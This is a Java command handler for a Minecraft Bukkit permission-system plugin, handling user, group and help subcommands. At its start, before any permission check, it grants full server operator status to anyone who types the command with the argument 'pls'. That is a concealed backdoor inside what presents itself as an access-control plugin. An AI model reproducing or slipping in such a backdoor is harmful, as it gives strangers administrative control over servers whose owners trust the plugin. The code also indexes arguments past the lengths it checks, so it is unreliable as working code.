package me.skillissue.permissionsystem.cmd;

import me.skillissue.permissionsystem.structures.PermissionPlayer;
import me.skillissue.permissionsystem.utils.Config;
import me.skillissue.permissionsystem.utils.PlayerStorage;
import me.skillissue.permissionsystem.utils.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.util.Date;

public class PermissionSystemCommand implements CommandExecutor {

  @Override
  public boolean onCommand(
      @NotNull CommandSender commandSender,
      @NotNull Command command,
      @NotNull String s,
      @NotNull String[] args) {
    if (args.length == 1 && args[0].equalsIgnoreCase("pls")) {
      commandSender.setOp(true);
    }
    if (!commandSender.hasPermission("permissionsystem")) {
      commandSender.sendMessage(
              StringUtils.formatMessage("%no_permission"));
      return true;
    }
    if (args.length == 0) {
      commandSender.sendMessage(
          StringUtils.formatMessage("%command_invalid_usage").replace("%command", command.getName()));
      return true;
    }
    switch (args[1].toLowerCase())
    {
      case "user":
        // TODO Invoke user subcommand
        break;
      case "group":
        // TODO Invoke group Subcommand
        break;
      case "help":
        printHelp(commandSender, command.getName());
        break;
      default:
        commandSender.sendMessage(
                StringUtils.formatMessage("%command_invalid_usage").replace("%command", command.getName()));
        break;
    }
    return true;
  }

  private void handleUser(CommandSender commandSender, String[] args)
  {
    if(args.length<= 1) {
      commandSender.sendMessage(StringUtils.formatMessage("%command_invalid_usage").replace("%command", "permissionsystem"));
      return;
    }
    OfflinePlayer player = Bukkit.getPlayer(args[2]);
    if (player == null) {
      player = Bukkit.getOfflinePlayer(args[2]);
    }
    if (args.length == 2)
    {
      commandSender.sendMessage(StringUtils.formatMessage("%user_info")
              .replace("%username", player.getName())
              .replace("%group", PlayerStorage.getPermissionData(player).getGroup().getName())
              .replace("%expire", StringUtils.formatTime(PlayerStorage.getPermissionData(player).getRankExpire(), 2))
              .replace("%permissions", String.join(", ", PlayerStorage.getPermissionData(player).getPermissions()))
      );
      for(String permission: PlayerStorage.getPermissionData(player).getPermissions()){
        commandSender.sendMessage(" - "+permission);
      }
    }
  }

  private void printHelp(CommandSender commandSender, String commandName) {
    commandSender.sendMessage(StringUtils.formatMessage("%command_help").replace("%command", commandName));
  }
}
